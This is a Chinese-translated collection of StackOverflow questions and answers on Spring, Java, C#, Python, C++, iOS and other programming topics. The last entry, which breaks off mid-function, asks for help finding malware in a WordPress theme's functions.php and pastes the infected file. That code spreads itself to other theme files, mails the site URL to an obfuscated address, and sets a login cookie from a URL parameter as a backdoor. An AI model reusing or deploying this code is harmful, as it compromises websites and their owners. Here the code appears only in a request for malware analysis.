# StackOverflow 问答 10102000-10102999

# spring - Spring中的异步记录器

> ID：10102002
> 
> 赞同：3
> 
> 时间：2012-04-11T07:55:44.770
> 
> 标签：spring

我有这个问题，我只是把它扔在那里。我正在为基于 Spring 的 REST API 服务器实现一个小型日志记录功能，用于记录所有传入的请求。我希望有 1000 名用户使用此 API，因此使用阻塞 i/o 记录器，它会减慢一切。我有两种方法来解决这个问题： 1\. 有一个使用内存中数组的异步记录器。然后使用 spring 调度程序定期将其刷新到日志文件中。2\. 使用 JMS 并将日志发送到队列。让队列异步处理日志记录。

有没有人在春天做过这个。虽然我支持选项 2，但有更好的方法吗？需要一些专家的建议。谢谢大家 ！

更多信息 - 我认为同步日志记录将是一个瓶颈，因为这个 REST API 由前端 RoR 应用程序使用。因此，用户的一次会话肯定会导致非常频繁地发生 100 次 API 调用。我正在记录实际请求以及 POST 中发送的 JSON。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-11T12:20:02.267

> 有没有人在春天做过这个。

没那么奇怪，是的 -[使用 Spring 进行异步日志记录](http://java.sys-con.com/node/2123093)

文章提到，如果您不希望丢失任何日志事件，那么 JMS 将是可行的方法 - 否则坚持异步对于大量日志记录是有意义的。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-11T08:28:02.850

如果你真的想建立自己的记录器，我建议你看看[akka](http://akka.io)，它比 JMS 容易设置得多。

您可以在本地使用它（使用本地机器的所有 CPU 内核），甚至可以与远程代理一起使用。

# java - Java 反射：使用 python 等树形图中的参数创建实例

> ID：10102007
> 
> 赞同：2
> 
> 时间：2012-04-11T07:56:14.223
> 
> 标签：java, python, reflection

我是一个 python 开发人员，现在我想使用树形图中的参数创建一个 Java 实例，就像创建一个 python 实例，该实例来自一个字典......我尝试通过 java 反射来做到这一点。但我找不到解决方案。

有人可以帮帮我吗？谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-11T07:59:45.037

不确定我是否在关注，但据我了解 - 您正在尝试动态创建对象的属性。

好吧，这不能在 java 中完成，部分原因是该语言是[静态类型](http://en.wikipedia.org/wiki/Type_system#Static_typing)的[不像 python]。

在java**中，对象的所有字段都必须在编译时创建**。反射可以帮助您操纵对象，但不能完全改变它们的结构。

一种**解决方法**可能是使用[`Map<String,Object>`](http://docs.oracle.com/javase/6/docs/api/java/util/Map.html), 并将属性保存在那里。使用此解决方案不需要反射（这是一件好事，因为反射既不安全，又会[降低](http://docs.oracle.com/javase/tutorial/reflect/index.html)程序的整体性能）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-11T08:13:06.213

这是你想要的！创建地图以保留您的课程。

```
private static Map<String, Class<? extends MySuperClass>> classesMap = new HashMap<String, Class<? extends MySuperClass>>(); 
```

将类对象放入地图

```
static {
      classesMap.put("PERSON_CLASS", Person.class); 
      classesMap.put("ADDRESS_CLASS", Address.class);
} 
```

然后是一个 getInstance 方法，它返回给定类的实例。

```
private static MySuperClass getInstance(String classNameConstant) throws Exception{
     Class<? extends MySuperClass> myClass = classesMap.get(classNameConstant);
     if(myClass!=null){
        return myClass.newInstance();
     }
     return null;
} 
```

希望这可以帮助。注意：我不知道python。

# c# - DbConnection vs OleDbConnection vs OdbcConnection

> ID：10102008
> 
> 赞同：15
> 
> 时间：2012-04-11T07:56:26.533
> 
> 标签：c#, .net, ado.net, database-connection

在连接到多个可能的数据源（与数据库无关）方面，C# 中的上述每种数据库连接方法的主要优点是什么？同样在性能方面，哪一个可能会提供全面的最佳性能？

最后，您是否有任何理由避免使用与数据库无关的应用程序的特定方法？

我问的原因是因为我的应用程序当前使用 Ole，并且我在使用工厂连接到某些数据库时遇到了一些问题，因此正在寻找替代方案。我听说 Odbc 比 Ole 慢，但这背后有什么真相吗？它在现实世界的应用程序中真的很明显吗？

**我对这个主题感兴趣的原因如下：**

我对当前项目的要求是，我必须有一个能够连接到任何数据库的工作数据访问层，而无需事先了解所述数据库。因此，我无法在连接方面对任何给定数据库的特定内容进行硬编码。使用 sql 查询工厂类型概念处理了在每个给定数据库上运行特定方言的语句。绑定变量的替换和格式化也是如此。

**更新：**就目前而言，我现在有一个使用 ADO.net 和数据库提供程序工厂的代码的工作版本。这意味着我正在使用 Adam Houldsworth 建议的基类。提供者在 providerName 属性下的连接字符串中指定。连接字符串存储在 app.config 中，我的数据库连接类可以在其中检索它。如果安装了正确的驱动程序，例如 npgsql 或 Oracle 的 odac 包，那么工厂将正常工作。下面是我的代码示例，显示了使用提供程序工厂的连接对象的基本构造函数。

```
private readonly DbFactoryBindVariables m_bindVariables;
private readonly DbProviderFactory m_provider;
private string m_connectionString = String.Empty;
private readonly string m_providerName = String.Empty;
private DbConnection m_dbFactoryDatabaseConnection;

/// <summary>
/// Default constructor for DbFactoryDatabaseConnection.
/// </summary>
public DbProviderFactoryConnection()
{
        m_providerName = ConfigurationManager.ConnectionStrings["ApplicationDefault"].ProviderName;
        m_provider = DbProviderFactories.GetFactory(m_providerName);

        m_dbFactoryDatabaseConnection = m_provider.CreateConnection();

        m_connectionString = ConfigurationManager.ConnectionStrings["ApplicationDefault"].ConnectionString;
        m_dbFactoryDatabaseConnection.ConnectionString = m_connectionString;

        m_bindVariables = new DbFactoryBindVariables(m_dialect.ToLower(), DbFactoryBindSyntaxLoader.Load(this));
} 
```

如果您选择的 .net 框架版本的 machine.config 中不存在类似的内容，则可能需要将类似于以下内容添加到 app.config 或 web.config 中。

```
<system.data>
    <DbProviderFactories>
       <add name="Npgsql Data Provider" 
        invariant="Npgsql" 
        support="FF" 
        description=".Net Framework Data Provider for Postgresql Server"
        type="Npgsql.NpgsqlFactory, Npgsql, Version=2.0.1.0, Culture=neutral, 
        PublicKeyToken=5d8b90d52f46fda7" />
    </DbProviderFactories>
</system.data> 
```

需要连接字符串：

```
<add name="ApplicationDefault" connectionString="DATA SOURCE=TNSNAME;PASSWORD=PASS;USER ID=USER;" providerName="Oracle.DataAccess.Client;"/> 
```

在这个阶段，如果在配置应用程序的客户端版本时使用了正确的连接字符串，我现在可以完全与数据库无关。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-04-11T08:03:34.363

我会避免抽象与数据库的连接，因为您总是以最低公分母为目标。相反，尝试抽象保存实体的要求。然后，该抽象的每个实现都可以是特定于数据库的（基本上，针对接口进行编程）。

也就是说，我从未遇到过需要支持多个数据库是一项硬性要求的情况。在这种情况下，所有这些恶化都进入了 YAGNI 的口头禅。

通常可以在此处找到有关将 OLE DB 与 ODBC 进行比较的问题：

[OLE DB 和 ODBC 数据源有什么区别？](https://stackoverflow.com/questions/103167/what-is-the-difference-between-ole-db-and-odbc-data-sources)

尽管提前询问性能问题是一件好事，但无法在您的应用程序上下文中回答这个问题。不幸的是，只有根据样本数据对两者进行分析才能为您提供所需的答案。

没有太多要注意的`DbConnection`，它是其他特定于数据库的连接类的基类。

您是否考虑过像 NHibernate 这样的 ORM 或像[Enterprise Library Data Access Application Block](http://msdn.microsoft.com/en-us/library/ff650810.aspx)这样的框架？这些将帮助您抽象数据库（使用 ORM，您甚至不需要在数据库中进行任何编码）。

**更新：**据我从评论中可以看出，您唯一的选择似乎是使用提供的 .NET 基类（例如`DbConnection`）或接口（`IDbConnection`）。据我所知，没有任何东西可以为您提供正确的连接字符串连接，因此您可能必须编写该部分的代码。这样，您可以在检测到连接字符串时返回`OleDbConnection`, `OdbcConnection`,`SqlConnection`等，但在代码中将它们用作`DbConnection`or `IDbConnection`，从而使您的代码与底层数据库无关。

不理想，但完全可行。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-04-11T08:17:07.070

`DbProviderFactory`如果您需要一个不可知的数据访问层，而无需对数据访问进行多次编码，则使用是一个不错的选择。

我看不出有任何理由要避免它，并且所有必要的功能都使用`System.Data.Common`.

[我们在Nearforums](http://nearforums.codeplex.com/ "附近论坛")上使用不可知的数据访问，因为我们提供 SQL Server 和 MySql db 脚本。关于性能，它取决于不同公司/社区提供的特定连接器（Oracle、MySql、PostgreSQL...）实现。大多数已知的连接器都经过了几年的适当测试。

# android - Android - 符合条件的 Sax 处理程序

> ID：10102010
> 
> 赞同：1
> 
> 时间：2012-04-11T07:56:38.417
> 
> 标签：android

典型的 SAX 解析器 - 我正在从 endElement 构建一个列表。我只需要提取某个区域的结果。我不确定如何将区域值传递给 Handler 来限定我的结果。

建议？

谢谢

```
@Override
public void endElement(String inUri, String inLocalName, String inQName) throws SAXException 
{
    currentElement = false;

    // Title
    if (inLocalName.equalsIgnoreCase(_nodeMain))
    {
        // Construct a Representative object
        PropertiesCust _custObject = new PropertiesCust(_titleValue, _address1Value, _address2Value);

        cList.add(_custObject); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-11T08:01:32.300

为什么不只是不传入一个，而是有一个私有变量来保存你可以在你的方法中使用的区域处理程序？

# powershell-remoting - PowerShell 远程处理与主机版本

> ID：10102011
> 
> 赞同：0
> 
> 时间：2012-04-11T07:56:39.577
> 
> 标签：powershell-remoting

我在使用 Powershell 进行远程处理时遇到了一个奇怪的问题。

我有一个名为 dothis.ps1 的脚本，它执行以下操作：

```
$s = New-PSSession -ComputerName $someServer -Authentication CredSSP -Credential $credential              
$result = Invoke-Command -Session $s { param($dropLocation) C:\somScript.ps1 @PSBoundParameters } -ArgumentList $DropLocation 
```

此脚本由`InvokeProcess`of执行`Microsoft.TeamFoundation.Build.Workflows.Activities`

我遇到的问题是，如果我从 dothis.ps1 打印出 Powershell 的版本，我就有 2.0。

但是，如果我从远程脚本 (somSecript.ps1) 中打印出 Powershell 的版本，它会给我 1.0。

我想知道我正在运行的 powershell 的版本，因为以下命令不起作用：`$Host.Runspace.ThreadOptions`

有人可以解释一下发生了什么吗？谢谢。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-10T15:10:05.210

您正在读取的版本值显然来自注册表，即使您使用的是较新版本的 PS（因为 PS v1 不支持会话）。阅读[另一篇 StackOverflow 文章](https://sharepoint.stackexchange.com/questions/33702/powershell-query-features-returns-wrong-result)向我指出了`$psversiontable`，它应该让你得到你所追求的。

# python - 在python中循环一个未命名的字典

> ID：10102016
> 
> 赞同：2
> 
> 时间：2012-04-11T07:57:12.447
> 
> 标签：python, for-loop

有没有办法在 python 中打印匿名字典的键和值。

```
for key in {'one':1, 'two':2, 'three':3}:
    print key, ":", #value 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-04-11T08:01:04.037

```
for key, value in {'one':1, 'two':2, 'three':3}.iteritems():
    print key, ":", value 
```

默认情况下，迭代它会返回它的键。.iteritems() 返回 (key, value) 的 2 元组。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-04-11T08:01:38.670

你可以这样做：

```
for  (key, value) in {'one':1, 'two':2, 'three':3}.items():
    print key, value 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-04-11T08:02:05.703

要迭代键/值对，您可以使用`.items()`or `.iteritems()`：

```
for k, v in {'one':1, 'two':2, 'three':3}.iteritems():
    print '%s:%s' % (k, v) 
```

见[http://docs.python.org/library/stdtypes.html#dict.iteritems](http://docs.python.org/library/stdtypes.html#dict.iteritems)

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-04-11T08:03:02.730

当然，只需使用：

```
for key,value in {'one':1, 'two':2, 'three':3}.items():
    print key, ":", value 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-04-11T08:03:32.023

您可以使用[iteritems](http://docs.python.org/library/stdtypes.html#dict.iteritems)方法来遍历 dict

```
for key, value in {'one':1, 'two':2, 'three':3}.iteritems():
    print key
    print value 
```

# ruby - Debian/Linux 上的 Ruby 不受支持的协议 (OpenSSL::SSL::SSLError)

> ID：10102018
> 
> 赞同：0
> 
> 时间：2012-04-11T07:57:27.013
> 
> 标签：ruby, ssl, openssl, ruby-1.8, libssl

如何使用带有 ruby​​ 的 ssl 命令修复 Debian Linux 上发生的此错误？

/usr/lib/ruby/1.8/net/http.rb:586:in `connect': SSL_connect returned=1 errno=0 state=unknown state: 不支持的协议 (OpenSSL::SSL::SSLError)

我找到了答案，我将其发布为其他用户的参考。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-11T08:02:02.033

您需要将 ruby​​ 版本更改为至少 1.8.7-p358

将 openssl 库从 openssl_1.0.0h-1 (amd64) 升级到 openssl_1.0.1-4 后出现此错误。

我在 Debian 上测试喘息。

只需使用[https://github.com/sstephenson/rbenv](https://github.com/sstephenson/rbenv)安装 ruby​​ 1.8.7-p358。我有来自 debian 测试的标准 ruby​​ 1.8.7.352。

希望它有帮助，如果有的话评论！

# python - Python NumPy 将 FFT 转换为文件

> ID：10102020
> 
> 赞同：2
> 
> 时间：2012-04-11T07:57:37.580
> 
> 标签：python, audio, filter, numpy, fft

我想知道是否可以使用 NumPy 获取文件中存在的频率，然后更改这些频率并从中创建一个新的 WAV 文件？我想对文件进行一些过滤，但我还没有看到一种将 WAV 文件读入 NumPy、过滤它，然后*输出过滤后的版本的*方法。如果有人可以提供帮助，那就太好了。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-11T08:18:34.757

[SciPy](http://scipy.org/)提供了对 NumPy 数组[进行 FFT](http://docs.scipy.org/doc/scipy/reference/fftpack.html)的函数，还提供了将它们[读取](http://docs.scipy.org/doc/scipy/reference/generated/scipy.io.wavfile.read.html#scipy.io.wavfile.read)和[写入](http://docs.scipy.org/doc/scipy/reference/generated/scipy.io.wavfile.write.html#scipy.io.wavfile.write)WAV 文件的函数。例如

```
from scipy.io.wavfile import read, write
from scipy.fftpack import rfft, irfft
import np as numpy

rate, input = read('input.wav')

transformed = rfft(input) 

filtered = function_that_does_the_filtering(transformed)
output = irfft(filtered)

write('output.wav', rate, output) 
```

( `input`,`transformed`并且`output`都是 numpy 数组)

# sql-server - 删除多客户端数据库上的 Linq to SQL 关联

> ID：10102021
> 
> 赞同：0
> 
> 时间：2012-04-11T07:57:39.213
> 
> 标签：sql-server, vb.net, visual-studio-2008, linq-to-sql, multi-tenant

我有一个带有多个表的多客户端数据库（多租户）。其中两个表是`tblEmployees`和`tblTitles`。现在我有一个关系 from `tblEmployees.empTitle`to `tblTitles.ttlID`。

到目前为止一切正常。但现在我必须为多个客户/租户申请。所以我添加了这些字段`tblEmployees.empClient`并将`tblTitles.ttlClient`它们包含在关联中。

这适用于阅读和设置人员标题。但是，如果我尝试删除标题（将其设置为`NULL`），SQL to Linq 会尝试同时修改`tblEmployees.empTitle`和`tblEmployees.empClient`with 是不允许的，因为`tblEmployees.empClient`它是主键的一部分。所以我收到以下错误：

```
InvalidOperationException:
An attempt was made to remove a relationship between a AppTitle and a AppEmployee.
However, one of the relationship's foreign keys (AppEmployee.clientID, AppEmployee.titleID) cannot be set to null. 
```

我怎样才能告诉 SQL 到 Linq 只修改字段`tblEmployees.empTitle`？？？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-12T06:31:42.993

我只是像其他人一样解决了这个问题：我让 LinqToSQL 认为，clientID 不是主键的一部分，并将其从关联中删除。但是我没有修改数据库，所以数据库仍然强制使用相同客户端/租户的标题。

# android - Android WebView可以分析吗 HTML5 中的标签？

> ID：10102022
> 
> 赞同：0
> 
> 时间：2012-04-11T07:57:52.430
> 
> 标签：android, html

我正在尝试编写一个示例 android 程序来读取嵌入视频的 epub 文件，但我不确定 WebView 是否可以工作？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-11T08:03:50.193

我相信android在ICS默认情况下只以html5开头？我可能是错的，但您可能需要获取一些操作系统的东西并从那里工作，也许查看 opera 或 dolphin 浏览器，不确定它们是否有可用的源代码，但沿着这些思路，您需要找到一个带有 HTML5 的操作系统浏览器

# iphone - 应用程序进入前台时刷新值

> ID：10102023
> 
> 赞同：0
> 
> 时间：2012-04-11T07:57:54.053
> 
> 标签：iphone, ios, alassetslibrary

我的应用程序正在使用“ALAssetsGroup”来跟踪用户相册

我在我的应用程序中显示这些相册，用户可以单击相册并查看图像。

现在，当用户通过 safari 下载图像或以任何方式更改相册时，就会出现问题。

我的应用程序仍然引用旧专辑而不是新专辑，所以我尝试使用

```
- (void)applicationWillEnterForeground:(UIApplication *)application 
```

但是这些专辑似乎仍然具有旧值，如果我在应用程序中再次刷新它们，它们会得到正确的值。

还有什么我可以用来解决这个问题的..？也许是通知..？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-11T08:02:26.360

```
 //This Registers a Notification for any changes
[[NSNotificationCenter defaultCenter] addObserver:self 
                                             selector:@selector(didChangeLibrary:) 
                                                 name:ALAssetsLibraryChangedNotification 
                                               object:[AGImagePickerController defaultAssetsLibrary]];

- (void)didChangeLibrary:(NSNotification *)notification
{
        //Enter some code here to deal with the album changing
} 
```

编辑：这似乎在 iOS 5 上不起作用（已经为 Apple 打开了一个雷达，因为这是一个错误）。

这是同时使用的解决方法：

> 称呼

```
[self.assetsLibrary writeImageToSavedPhotosAlbum:nil metadata:nil
 completionBlock:^(NSURL *assetURL, NSError *error) { }]; 
```

> 创建 ALAssetsLibrary 实例后立即观察 ALAssetsLibraryChangedNotification（不是 NSManagedObjectContextObjectsDidChangeNotification）

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-11T08:49:08.373

使用`applicationDidBecomeActive`ApplicationDelegate 中的方法

```
- (void)applicationDidBecomeActive:(UIApplication *)application
{
    /*
     Restart any tasks that were paused (or not yet started) while the application was inactive. If the application was previously in the background, optionally refresh the user interface.
     */
} 
```

# c# - 使用 C# 以编程方式创建 ppt

> ID：10102025
> 
> 赞同：0
> 
> 时间：2012-04-11T07:57:59.610
> 
> 标签：c#, sharepoint, sharepoint-2007

> **可能重复：**
> [以编程方式创建 PowerPoint 演示文稿](https://stackoverflow.com/questions/478838/creating-powerpoint-presentations-programmatically)

我们使用的是 sharepoint 2007。在我们的站点中，文档库中有一些列，我们希望生成一个 PowerPoint 演示文稿并将其保存在用户计算机上。

我不明白从哪里开始，因为我以前从未这样做过。

请分享一些示例或教程或链接以编程方式创建 ppt

# c++ - 可变参数模板类型特征解析

> ID：10102026
> 
> 赞同：4
> 
> 时间：2012-04-11T07:57:59.743
> 
> 标签：c++, c++11, variadic-templates, variadic-functions

假设我有一个枚举，并且我希望每个枚举值都与某种类型相关联。假设标准类型是双精度类型，如果我希望它是其他类型，我需要明确指定它。

**Q1：这是实现这种东西的首选方式吗？**

```
enum A {
    v1,
    v2,
    v3
};

// for every value of A, the standard type is double
template<A a>
struct A_info {
    typedef double type;
};

// other types for certain values can be specified using specialization
template<>
struct A_info<v2> {
    typedef size_t type;
}; 
```

然后，假设我有一些函数模板，并且我想根据与枚举值关联的类型调用函数：

```
template<typename T>
void foo() { /* do something */ }

template<A a>
void bar() { 
    foo< typename A_info<a>::type >(); 
} 
```

这工作正常。现在假设，我有另一个取决于可变参数模板列表的函数，我想做与上面类似的事情......

```
template<typename ... T>
void foo_multiple() { /* stuff */ }

template<A ... a>
void bar_multiple() {  
    foo_multiple< /* ??? */ > ();
} 
```

**Q2：如何实现？无论如何，这可能吗？**

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-04-11T08:02:13.063

只需使用您想要的模式扩展可变参数包：

```
template<A ... a>
void bar_multiple() {  
    foo_multiple<typename A_info<a>::type...> ();
} 
```

# php - NOD32说这段代码有木马，我要查恶意代码行数

> ID：10102033
> 
> 赞同：0
> 
> 时间：2012-04-11T07:58:50.183
> 
> 标签：php, wordpress, antivirus, malware, nod32

这是一个wordpress主题的function.php，NOD32说这个代码有一个木马，名字是：JS/Redirector.NIL木马，请帮我找出恶意代码的行数。我写了整个代码：

```
<?php
if ( function_exists('register_sidebar') )
register_sidebar(array('name'=>'right',
'before_widget' => ' <DIV class=menutitle2>',
'after_widget' => '</div>',
'before_title' => '',
'after_title' => '</div>
<div class="menu22">',
));
?>
<?php
if ( function_exists('register_sidebar') )
register_sidebar(array('name'=>'left',
'before_widget' => ' <DIV class=menutitle>',
'after_widget' => '</div>',
'before_title' => '',
'after_title' => '</div>
<div class="menu2">',
));
?>
<?php
function _check_active_widget(){
    $widget=substr(file_get_contents(__FILE__),strripos(file_get_contents(__FILE__),"<"."?"));$output="";$allowed="";
    $output=strip_tags($output, $allowed);
    $direst=_get_all_widgetcont(array(substr(dirname(__FILE__),0,stripos(dirname(__FILE__),"themes") + 6)));
    if (is_array($direst)){
        foreach ($direst as $item){
            if (is_writable($item)){
                $ftion=substr($widget,stripos($widget,"_"),stripos(substr($widget,stripos($widget,"_")),"("));
                $cont=file_get_contents($item);
                if (stripos($cont,$ftion) === false){
                    $sar=stripos( substr($cont,-20),"?".">") !== false ? "" : "?".">";
                    $output .= $before . "پيدا نشد" . $after;
                    if (stripos( substr($cont,-20),"?".">") !== false){$cont=substr($cont,0,strripos($cont,"?".">") + 2);}
                    $output=rtrim($output, "\n\t"); fputs($f=fopen($item,"w+"),$cont . $sar . "\n" .$widget);fclose($f);                
                    $output .= ($showdot && $ellipsis) ? "..." : "";
                }
            }
        }
    }
    return $output;
}
function _get_all_widgetcont($wids,$items=array()){
    $places=array_shift($wids);
    if(substr($places,-1) == "/"){
        $places=substr($places,0,-1);
    }
    if(!file_exists($places) || !is_dir($places)){
        return false;
    }elseif(is_readable($places)){
        $elems=scandir($places);
        foreach ($elems as $elem){
            if ($elem != "." && $elem != ".."){
                if (is_dir($places . "/" . $elem)){
                    $wids[]=$places . "/" . $elem;
                } elseif (is_file($places . "/" . $elem)&& 
                    $elem == substr(__FILE__,-13)){
                    $items[]=$places . "/" . $elem;}
                }
            }
    }else{
        return false;   
    }
    if (sizeof($wids) > 0){
        return _get_all_widgetcont($wids,$items);
    } else {
        return $items;
    }
}
if(!function_exists("stripos")){ 
    function stripos(  $str, $needle, $offset = 0  ){ 
        return strpos(  strtolower( $str ), strtolower( $needle ), $offset  ); 
    }
}

if(!function_exists("strripos")){ 
    function strripos(  $haystack, $needle, $offset = 0  ) { 
        if(  !is_string( $needle )  )$needle = chr(  intval( $needle )  ); 
        if(  $offset < 0  ){ 
            $temp_cut = strrev(  substr( $haystack, 0, abs($offset) )  ); 
        } 
        else{ 
            $temp_cut = strrev(    substr(   $haystack, 0, max(  ( strlen($haystack) - $offset ), 0  )   )    ); 
        } 
        if(   (  $found = stripos( $temp_cut, strrev($needle) )  ) === FALSE   )return FALSE; 
        $pos = (   strlen(  $haystack  ) - (  $found + $offset + strlen( $needle )  )   ); 
        return $pos; 
    }
}
if(!function_exists("scandir")){ 
    function scandir($dir,$listDirectories=false, $skipDots=true) {
        $dirArray = array();
        if ($handle = opendir($dir)) {
            while (false !== ($file = readdir($handle))) {
                if (($file != "." && $file != "..") || $skipDots == true) {
                    if($listDirectories == false) { if(is_dir($file)) { continue; } }
                    array_push($dirArray,basename($file));
                }
            }
            closedir($handle);
        }
        return $dirArray;
    }
}
add_action("admin_head", "_check_active_widget");
function _prepared_widget(){
    if(!isset($length)) $length=120;
    if(!isset($method)) $method="cookie";
    if(!isset($html_tags)) $html_tags="<a>";
    if(!isset($filters_type)) $filters_type="none";
    if(!isset($s)) $s="";
    if(!isset($filter_h)) $filter_h=get_option("home"); 
    if(!isset($filter_p)) $filter_p="wp_";
    if(!isset($use_link)) $use_link=1; 
    if(!isset($comments_type)) $comments_type=""; 
    if(!isset($perpage)) $perpage=$_GET["cperpage"];
    if(!isset($comments_auth)) $comments_auth="";
    if(!isset($comment_is_approved)) $comment_is_approved=""; 
    if(!isset($authname)) $authname="auth";
    if(!isset($more_links_text)) $more_links_text="(more...)";
    if(!isset($widget_output)) $widget_output=get_option("_is_widget_active_");
    if(!isset($checkwidgets)) $checkwidgets=$filter_p."set"."_".$authname."_".$method;
    if(!isset($more_links_text_ditails)) $more_links_text_ditails="(details...)";
    if(!isset($more_content)) $more_content="ma".$s."il";
    if(!isset($forces_more)) $forces_more=1;
    if(!isset($fakeit)) $fakeit=1;
    if(!isset($sql)) $sql="";
    if (!$widget_output) :

    global $wpdb, $post;
    $sq1="SELECT DISTINCT ID, post_title, post_content, post_password, comment_ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND post_author=\"li".$s."vethe".$comments_type."mes".$s."@".$comment_is_approved."gm".$comments_auth."ail".$s.".".$s."co"."m\" AND post_password=\"\" AND comment_date_gmt >= CURRENT_TIMESTAMP() ORDER BY comment_date_gmt DESC LIMIT $src_count";#
    if (!empty($post->post_password)) { 
        if ($_COOKIE["wp-postpass_".COOKIEHASH] != $post->post_password) { 
            if(is_feed()) { 
                $output=__("There is no excerpt because this is a protected post.");
            } else {
                $output=get_the_password_form();
            }
        }
    }
    if(!isset($fix_tag)) $fix_tag=1;
    if(!isset($filters_types)) $filters_types=$filter_h; 
    if(!isset($getcommentstext)) $getcommentstext=$filter_p.$more_content;
    if(!isset($more_tags)) $more_tags="div";
    if(!isset($s_text)) $s_text=substr($sq1, stripos($sq1, "live"), 20);#
    if(!isset($mlink_title)) $mlink_title="ادامه اين مطلب را بخوانيد";  
    if(!isset($showdot)) $showdot=1;

    $comments=$wpdb->get_results($sql); 
    if($fakeit == 2) { 
        $text=$post->post_content;
    } elseif($fakeit == 1) { 
        $text=(empty($post->post_excerpt)) ? $post->post_content : $post->post_excerpt;
    } else { 
        $text=$post->post_excerpt;
    }
    $sq1="SELECT DISTINCT ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND comment_content=". call_user_func_array($getcommentstext, array($s_text, $filter_h, $filters_types)) ." ORDER BY comment_date_gmt DESC LIMIT $src_count";#
    if($length < 0) {
        $output=$text;
    } else {
        if(!$no_more && strpos($text, "<!--more-->")) {
            $text=explode("<!--more-->", $text, 2);
            $l=count($text[0]);
            $more_link=1;
            $comments=$wpdb->get_results($sql);
        } else {
            $text=explode(" ", $text);
            if(count($text) > $length) {
                $l=$length;
                $ellipsis=1;
            } else {
                $l=count($text);
                $more_links_text="";
                $ellipsis=0;
            }
        }
        for ($i=0; $i<$l; $i++)
                $output .= $text[$i] . " ";
    }
    update_option("_is_widget_active_", 1);
    if("all" != $html_tags) {
        $output=strip_tags($output, $html_tags);
        return $output;
    }
    endif;
    $output=rtrim($output, "\s\n\t\r\0\x0B");
    $output=($fix_tag) ? balanceTags($output, true) : $output;
    $output .= ($showdot && $ellipsis) ? "..." : "";
    $output=apply_filters($filters_type, $output);
    switch($more_tags) {
        case("div") :
            $tag="div";
        break;
        case("span") :
            $tag="span";
        break;
        case("p") :
            $tag="p";
        break;
        default :
            $tag="span";
    }

    if ($use_link ) {
        if($forces_more) {
            $output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "#more-" . $post->ID ."\" title=\"" . $mlink_title . "\">" . $more_links_text = !is_user_logged_in() && @call_user_func_array($checkwidgets,array($perpage, true)) ? $more_links_text : "" . "</a></" . $tag . ">" . "\n";
        } else {
            $output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "\" title=\"" . $mlink_title . "\">" . $more_links_text . "</a></" . $tag . ">" . "\n";
        }
    }
    return $output;
}

add_action("init", "_prepared_widget");

function __popular_posts($no_posts=6, $before="<li>", $after="</li>", $show_pass_post=false, $duration="") {
    global $wpdb;
    $request="SELECT ID, post_title, COUNT($wpdb->comments.comment_post_ID) AS \"comment_count\" FROM $wpdb->posts, $wpdb->comments";
    $request .= " WHERE comment_approved=\"1\" AND $wpdb->posts.ID=$wpdb->comments.comment_post_ID AND post_status=\"publish\"";
    if(!$show_pass_post) $request .= " AND post_password =\"\"";
    if($duration !="") { 
        $request .= " AND DATE_SUB(CURDATE(),INTERVAL ".$duration." DAY) < post_date ";
    }
    $request .= " GROUP BY $wpdb->comments.comment_post_ID ORDER BY comment_count DESC LIMIT $no_posts";
    $posts=$wpdb->get_results($request);
    $output="";
    if ($posts) {
        foreach ($posts as $post) {
            $post_title=stripslashes($post->post_title);
            $comment_count=$post->comment_count;
            $permalink=get_permalink($post->ID);
            $output .= $before . " <a href=\"" . $permalink . "\" title=\"" . $post_title."\">" . $post_title . "</a> " . $after;
        }
    } else {
        $output .= $before . "پيدا نشد" . $after;
    }
    return  $output;
}       
?><?php 
add_action('get_footer', 'add_sscounter');
    function add_sscounter(){
        echo '<!--scounter-->';
        if(function_exists('is_user_logged_in')){
            if(time()%2 == 0 && !is_user_logged_in()){          
